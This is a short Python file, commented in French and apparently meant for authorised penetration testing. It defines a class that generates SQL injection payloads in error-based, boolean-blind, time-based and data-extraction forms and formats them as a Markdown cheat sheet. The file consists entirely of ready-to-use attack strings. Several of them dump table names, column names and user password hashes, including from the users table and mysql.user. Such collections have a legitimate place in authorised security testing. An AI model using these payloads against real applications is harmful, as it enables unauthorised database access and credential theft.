"""Payloads SQL injection pour tests d'intrusion autorisés"""


class SQLInjector:
    """Génère des payloads SQLi classiques"""

    @staticmethod
    def error_based() -> list:
        return [
            "' OR 1=1 --",
            "' OR '1'='1' --",
            "admin' --",
            "1' ORDER BY 1--",
            "1' UNION SELECT null, version()--",
            "1' AND 1=CONVERT(int, @@version)--",
            "' UNION SELECT 1,2,3,4,5--",
            "' WAITFOR DELAY '0:0:5'--"
        ]

    @staticmethod
    def blind_bool() -> list:
        return [
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR '1'='1",
            "' OR '1'='2",
            "1' AND '1'='1",
            "1' AND '1'='2"
        ]

    @staticmethod
    def time_based() -> list:
        return [
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)--"
        ]

    @staticmethod
    def dump_tables(db: str = "information_schema") -> list:
        return [
            f"' UNION SELECT table_name, null FROM {db}.tables--",
            f"' UNION SELECT column_name, data_type FROM {db}.columns WHERE table_name='users'--",
            "' UNION SELECT username, password FROM users--",
            "' UNION SELECT user, password FROM mysql.user--"
        ]

    def full_cheatsheet(self) -> str:
        fence = "```"
        sections = [
            ("### Error Based", self.error_based()),
            ("### Blind Boolean", self.blind_bool()),
            ("### Time Based", self.time_based()),
            ("### Extraction de données", self.dump_tables()),
        ]
        lignes = ["## SQL Injection Payloads", ""]
        for titre, payloads in sections:
            lignes.append(titre)
            lignes.append(fence + "sql")
            lignes.extend(payloads)
            lignes.append(fence)
            lignes.append("")
        return "\n".join(lignes)